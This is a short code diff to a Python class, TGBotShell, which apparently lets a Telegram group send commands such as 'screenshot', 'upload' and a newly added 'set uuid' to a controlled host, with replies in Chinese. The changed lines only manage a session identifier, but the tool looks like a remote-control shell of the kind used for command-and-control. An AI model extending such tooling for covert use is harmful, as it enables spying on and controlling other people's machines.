@@ -97,7 +97,17 @@ class TGBotShell:
         for item_user in updates:
             cmd_list = str(item_user["text"]).split(" ")
             print(cmd_list)
-            if cmd_list[0] == "screenshot":
+            if cmd_list[0] == "set":
+                if cmd_list[1] == "uuid":
+                    self.UUID = cmd_list[2].replace(" ","")
+                    self.send_chat_msg(
+                        {"chatid": self.GroupID, "username": item_user['username'],
+                         "text": f"主机：{self.UUID}\n已成功更新UUID会话标识！"})
+                else:
+                    self.send_chat_msg(
+                        {"chatid": self.GroupID, "username": item_user['username'],
+                         "text": f"主机：{self.UUID}\n该命令 {cmd_list} 并不存在，请输入命令 /help 后查看语法！"})
+            elif cmd_list[0] == "screenshot":
                 self.send_chat_msg(
                     {"chatid": self.GroupID, "username": item_user['username'], "text": f"主机：{self.UUID}\n执行screenshot！"})
             elif cmd_list[0] == "upload":
